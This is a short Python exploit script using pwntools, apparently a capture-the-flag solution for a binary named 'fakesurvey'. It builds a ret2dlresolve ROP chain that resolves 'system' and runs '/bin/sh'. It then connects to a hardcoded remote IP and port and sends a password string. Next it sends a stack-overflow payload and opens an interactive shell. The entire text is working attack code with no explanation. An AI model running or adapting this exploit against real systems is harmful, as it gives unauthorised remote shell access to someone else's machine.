from pwn import *
context.binary = elf = ELF('./fakesurvey')

rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

p = remote('185.235.41.205', 7050)
p.sendline("CPRSyRMOFa3FVIF")
p.sendline(fit({64+context.bytes*3: raw_rop, 200: dlresolve.payload}))
p.interactive()
